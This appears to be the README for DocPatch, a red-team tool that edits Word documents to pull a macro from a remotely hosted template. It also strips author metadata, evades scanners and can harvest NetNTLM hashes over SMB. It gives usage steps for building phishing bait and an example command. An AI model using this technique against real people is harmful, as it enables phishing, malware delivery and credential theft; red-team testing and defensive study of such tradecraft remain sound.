# DocPatch

DocPatch is a simple script that edits the XML of a macro-enabled Word document (.docm or Word 97 document) to add a reference to a remote stylesheet. The script produces an "armed" version of the document with the remote reference. bfore creating the final document, DocPatch strips out the author/creator metadata to anonymize the document.

This armed document is macroless and will appear entirely benign if scanned. When opened, the new document will try to fetch the remote stylesheet. The remote template, however, can contain a macro that will then be loaded before the document is opened. The user will see the typical "Enable Content" prompt for executing the macro.

As an added benefit, web server hits will let you know the document has been opened and Word is able to call out to an external resource. Even if the macro is not enabled or fails, you will have collecting some useful information.

## Usage

1. Create a Word document with your desired macro, save it as a macro-enabled template (.dotm), and then host it somewhere. It can be hosted using HTTP/S, WebDAV, or SMB.
2. Create the Word document that will be used as your phishing bait. It can be blank, a resume, a report, or anything else. The only requirement is the document must be saved as a macro-enabled document (.dotm) or a Word 97 document.
3. Provide your template URL and your bait document to DocPatch to produce the armed version.
4. Open the document in a test environment with a copy of Office. You should see requests to your server and may notice Word's splash screen mention it is contacting a server.
5. The document should then present you with an "Enable Content" prompt for the template's macro.

Note: If you use a file sharing service or something else that does not show you access logs it will be more difficult to know if your documents are landing and being opened.

### Example Command

`docpatch.py --doc resume.docm --server http://127.0.0.1:8000/template.dotm`

### Alternative Usage

This method can also be used to collect NetNTLM hashes using SMB.

## Installation

Using pipenv for managing the required libraries is the best option to avoid Python installations getting mixed-up. Do this:

1. Run: `pip3 install --user pipenv` or `python3 -m pip install --user pipenv`
2. Clone DocPatch's repo.
3. Run: `cd DocPatch && pipenv install`
4. Start using DocPatch by running: `pipenv shell`

If you would prefer to not use pipenv, the list of required packages can be found in the Pipfile file.